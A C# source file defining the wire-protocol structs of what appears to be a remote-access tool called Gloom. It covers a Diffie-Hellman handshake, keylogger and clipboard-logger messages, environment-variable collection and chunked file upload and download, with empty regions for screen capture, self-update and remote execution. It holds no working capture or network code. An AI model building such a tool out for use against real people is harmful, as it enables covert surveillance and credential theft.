using System.Runtime.InteropServices;

namespace Gloom;

public static class OpStructs
{
	#region Handshake
	[Serializable]
	public struct ClientHello // SSL Client Hello + Client Key Exchange
	{
		public string Identifier { get; set; }
		public byte[] ClientRandom { get; set; }
		public byte[] DHParameter;
		public int KDFIterations { get; set; }
		public int KDFMemorySize { get; set; }
		public int KDFParallelism { get; set; }
	}

	[Serializable]
	public struct ServerHello // SSL Server Hello + Server Key Exchange
	{
		public byte[] ServerRandom { get; set; }
		public byte[] DHParameter { get; set; }
	}
	#endregion

	#region Global
	#endregion

	#region KeyLogger
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct KeyLoggerSettingRequest
	{
		public int Mode;
		public int SaveInterval;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct KeyLogRequest
	{
		public int LogCount;
	}

	[Serializable]
	public struct KeyLogResponse
	{
		public int LogIndex { get; set; }
		public byte[] CompressedLog { get; set; }
	}
	#endregion

	#region ClipboardLogger
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ClipboardLoggerRequest
	{
		public Guid RequestType;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ClipboardLoggerStateResponse
	{
		public bool Enabled;
	}

	[Serializable]
	public struct ClipboardLogResponse
	{
		public byte[] CompressedKeyLogs;
	}
	#endregion

	#region ScreenCapturer
	#endregion

	#region SelfUpdater
	#endregion

	#region InfoCollector
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct EnvVarsRequest
	{
	}

	[Serializable]
	public struct EnvVarsResponse
	{
		public List<(string, string)> Map { get; set; }
	}
	#endregion

	#region FileIO
	[Serializable]
	public struct UploadFileRequest
	{
		public Guid Ident { get; set; }
		public string Destination { get; set; }
		public long TotalChunkCount { get; set; }
	}

	[Serializable]
	public struct UploadFileChunkResponse
	{
		public Guid Ident { get; set; }
		public long ChunkIndex { get; set; }
		public byte[] Data { get; set; }
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct UploadFileResponse
	{
		public Guid Ident { get; set; }
		public long TotalChunkCount;
	}

	[Serializable]
	public struct DownloadFileRequest
	{
		public Guid Ident { get; set; }
		public string Source { get; set; }
	}

	[Serializable]
	public struct DownloadFileChunkResponse
	{
		public Guid Ident { get; set; }
		public long ChunkIndex { get; set; }
		public byte[] Data { get; set; }
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct DownloadFileResponse
	{
		public Guid Ident { get; set; }
		public long TotalChunkCount;
	}
	#endregion

	#region Remote File Execution
	#endregion
}
